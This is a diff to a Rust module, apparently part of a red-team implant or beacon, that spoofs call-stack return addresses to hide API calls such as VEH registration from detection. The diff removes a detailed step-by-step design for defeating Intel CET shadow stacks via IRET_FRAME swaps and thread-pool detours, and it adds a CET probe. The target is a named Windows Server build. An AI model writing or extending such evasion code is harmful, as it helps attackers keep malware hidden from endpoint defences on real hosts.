@@ -30,13 +30,19 @@
 //! the JMP (no entry) and the target function's RET pops from the shadow
 //! stack — entry from the previous CALL. Mismatch = #CP on CET hardware.
 //!
-//! **On CET-enabled processes, use `call_with_iret_frame!` instead**, which
-//! uses `call` (not `jmp`) with a pre-arranged stack frame so the shadow
-//! stack remains consistent.
+//! A CET-safe spoof path (constructed IRET_FRAME or shadow-stack surgery via
+//! `wrssq`/`incsspq`) was removed — both require real CET-capable hardware
+//! (Tiger Lake+ with HSP enabled) to validate, and the engagement target
+//! (Server 2019 17763.1339, no CET) does not have it. Instead,
+//! [`call_with_spoofed_return`] self-gates: it probes CET via
+//! [`is_cet_enabled`] and degrades to [`call_plain`] (no spoofing) on
+//! CET-enabled processes. The CET probe itself is retained as a runtime
+//! diagnostic ([`selftest_cet_status`]) so the operator can see whether the
+//! spoof path is active on the current host.
 //!
 //! # Usage
 //! ```text
-//! // Non-CET: fake ADD RSP;RET return
+//! // Non-CET: fake ADD RSP;RET return (auto-degrades to plain call under CET)
 //! let handle = caller_spoof::call_with_spoofed_return(
 //!     addr_of_add_veh, st, 1, hwbp_veh_handler as usize,
 //! );
@@ -203,7 +209,7 @@ struct ImageSectionHeader {
 //     REAL return address (the one that resumes `call_with_spoofed_return`'s
 //     caller). We provide both the spacer and the real RA ourselves.
 //
-// # CET — the hard limitation
+// # CET — runtime probe + honest degrade
 //
 // On Intel CET (shadow-stack) hardware with the process opted into HSP, the
 // target fn's `ret` compares the popped real-stack return address with the
@@ -212,16 +218,16 @@ struct ImageSectionHeader {
 // `call_with_spoofed_return`'s own caller — NOT the fake stub addr. This is a
 // mismatch → `#CP` (control-flow exception) → process is terminated.
 //
-// Properly reconciling this needs either `incsspq`/`wrssq` shadow-stack
-// surgery or a constructed IRET_FRAME (call + align the shadow stack across a
-// crafted frame). Both are substantial and out of scope for this pass; see
-// `call_with_iret_frame` below for the TODO + design notes.
-//
-// Until the CET variant lands, `call_with_spoofed_return` performs an honest
-// runtime CET probe and, if CET is on, *degrades to a plain call* (no spoofing)
-// rather than crashing the beacon. Spoofing off + beacon alive beats spoofing
-// on + #CP kill. The fallback is logged via the diagnostic pin (see `diag`
-// gating in blind_hwbp — currently inert in production).
+// A CET-safe spoof path (constructed IRET_FRAME or shadow-stack surgery) was
+// removed from this file — both approaches require real CET-capable hardware
+// to validate, and the engagement target (Server 2019 17763.1339, no CET)
+// does not have it. What stays is the runtime CET probe
+// ([`is_cet_enabled`], surfaced via [`selftest_cet_status`]) plus an honest
+// degrade: if CET is detected, `call_with_spoofed_return` falls back to a
+// plain call (no spoofing) rather than crashing the beacon. Spoofing off +
+// beacon alive beats spoofing on + #CP kill. The CET probe is kept as a
+// runtime diagnostic so the operator knows whether spoof is active on the
+// current host.
 
 /// Win64 feature constant for `IsProcessorFeaturePresent`: Intel CET shadow
 /// stack (Hardware-enforced Stack Protection). Documented in winnt.h as
@@ -439,85 +445,21 @@ unsafe fn call_plain(target: usize, a1: usize, a2: usize, a3: usize, a4: usize) 
     result
 }
 
-// ---- CET path: IRET-frame construction (TODO) -----------------------------
+// ---- CET path: removed ----------------------------------------------------
 //
-// `call_with_iret_frame` — the CET-safe counterpart. NOT implemented in this
-// pass; this is the documented design for a follow-up. The blocker is that
-// every approach needs either privileged shadow-stack instructions or a
-// carefully-built IRET_FRAME, both of which carry meaningful complexity and
-// need real-hardware test (we have no CET QEMU image in CI today).
+// An earlier revision of this file carried a `call_with_iret_frame` stub plus
+// a ~80-line design note for three CET-safe spoof strategies (shadow-stack
+// surgery, IRET_FRAME swap, thread-pool detour). All three require real
+// CET-capable hardware (Intel Tiger Lake+ with HSP enabled) to validate, and
+// the engagement target (Server 2019 17763.1339, no CET) does not have it —
+// the path could never be more than dead code with a "TODO(CET)" marker.
 //
-// # Sketch (three viable strategies, by complexity)
-//
-// 1. **Shadow-stack surgery via `wrssq`/`incsspq`** (privileged on most OSes;
-//    user-mode `wrssq` requires `CR4.CET` + the process to be CET-enabled,
-//    which is precisely when we'd need it — but Windows currently does NOT
-//    expose user-mode `wrssq`; it manages the shadow stack from kernel mode).
-//    Not viable on stock Windows 10/11 as of 2026-07. Listed for completeness.
-//
-// 2. **IRET_FRAME swap** (the classical CheatProgrammer / LoneW01f approach):
-//    build a fake IRET_FRAME on the stack (RIP=target, CS=0x33, RFLAGS, RSP,
-//    SS=0x2B), then `iretq` into the target. IRET does NOT push a shadow-stack
-//    entry, so the target fn's `ret` matches the shadow stack at the point of
-//    the *previous* real call. After the target RETs we land at... whatever
-//    was there. To return to US, we plant our real RA on the IRET_FRAME's
-//    stack. The mechanics:
-//      a. allocate a small fake stack region (per-thread, reused).
-//      b. write IRET_FRAME: RIP=target, CS=0x33, RFLAGS=read via pushfq, RSP
-//         = (fake stack top - 8) where [fake stack top - 8] = real RA.
-//      c. `pushfq; pop rax` to capture RFLAGS, mask IF appropriately.
-//      d. `iretq` — transfers to target with the fake stack + shadow stack
-//         unchanged. Target RETs into real RA on the FAKE stack.
-//      e. real RA lands us back in this fn; restore the real stack pointer.
-//    Subtleties: iretq from ring-3 to ring-3 doesn't switch stacks; SS:RSP
-//    come from the frame. CS must be 0x33 (64-bit user code). RPL etc.
-//    This WORKS on stock Win10/11 + CET, per the r/netsec write-up (result #1
-//    from the WebSearch). Implement after a CET-capable test VM exists.
-//
-// 3. **Thread-pool / Enum-system-callback detour** (the r/netsec "CET-compliant
-//    callstack spoofing via Thread Pool & Enum Callback" technique): instead
-//    of spoofing inline, queue an APC / threadpool work item whose CALLER is
-//    a legitimate ntdll!Tp... or Enum* function. The callback runs with a
-//    real, CET-clean call stack rooted in ntdll. No asm trickery needed; cost
-//    is async semantics (caller must wait on an event) + the callback's args
-//    are constrained. Most robust of the three; worst fit-for-purpose for
-//    synchronous VEH registration.
-//
-// # Recommended next step
-// Implement strategy 2 (IRET_FRAME) behind a `#[cfg(feature = "cet_spoof")]`
-// gate, with a hard `is_cet_enabled()` gate at entry and an unconditional
-// fallback to `call_plain` if the IRET path fails. Test on Intel Tiger Lake
-// or newer with HSP enabled (Win11 22H2+ default for compatible processes).
-//
-// Until then: `call_with_spoofed_return` self-gates and degrades; this TODO
-// is the tracking note for closing the CET gap.
-/// Call a target with a CET-safe spoofed return (constructed IRET_FRAME).
-///
-/// NOT YET IMPLEMENTED — currently degrades unconditionally to `call_plain`
-/// (no spoofing). See the large comment block above for the design of the
-/// three viable CET strategies (shadow-stack surgery, IRET_FRAME swap,
-/// thread-pool detour). Tracked as TODO(CET).
-///
-/// # Safety
-/// Same contract as [`call_with_spoofed_return`]: `target` must be a Win64-
-/// callable fn of arity <= 4, and the target must not unwind. Until the IRET
-/// implementation lands this is exactly as safe as `call_plain` (it IS
-/// `call_plain`).
-#[allow(dead_code)]
-pub unsafe fn call_with_iret_frame(
-    _stub: ReturnStub,
-    _target: usize,
-    _a1: usize,
-    _a2: usize,
-    _a3: usize,
-    _a4: usize,
-) -> usize {
-    // TODO(CET): implement strategy 2 (IRET_FRAME) per the design notes above.
-    // For now, unconditionally degrade — there is no spoof path that is both
-    // CET-safe and synchronous-inline. Callers that need spoofing on CET must
-    // route through the thread-pool detour (strategy 3) externally.
-    call_plain(_target, _a1, _a2, _a3, _a4)
-}
+// What stays:
+//   * `is_cet_enabled()` — the runtime probe (kept as a diagnostic).
+//   * `selftest_cet_status()` — surfaces the probe result to the operator.
+//   * `call_with_spoofed_return` self-gates on `is_cet_enabled()` and degrades
+//     to `call_plain` under CET, so a CET-capable host still runs (just without
+//     spoofing) instead of #CP-killing the beacon.
 
 // ---- Thin macro wrapper (matches the documented `call_with_spoofed_return!`
 // surface so existing doc references resolve) ------------------------------
@@ -592,4 +534,28 @@ pub fn selftest_spoof_path() -> u8 {
         flags |= 4;
     }
     flags
+}
+
+/// Selftest: report CET shadow-stack status. The IRET_FRAME spoof path that
+/// would have used this to decide between spoofed and plain calls under CET
+/// was removed (it needed CET-capable hardware the engagement target lacks);
+/// the probe itself is kept as a runtime diagnostic so the operator knows
+/// whether [`call_with_spoofed_return`] is actually spoofing on this host or
+/// has degraded to [`call_plain`].
+///
+/// Returns:
+///   0 = CET not present (spoof path active when a usable stub is found)
+///   1 = CET present (spoof path degrades to `call_plain`)
+///
+/// Note `is_cet_enabled` fails OPEN (returns `false`) if it cannot resolve
+/// `IsProcessorFeaturePresent` — that resolution failure is indistinguishable
+/// from "CET genuinely off" here. On a PEB-walk-bootstrapped implant the
+/// resolver is reliable, so this only matters in the degenerate
+/// pre-bootstrap window.
+pub fn selftest_cet_status() -> u8 {
+    if unsafe { is_cet_enabled() } {
+        1
+    } else {
+        0
+    }
 }
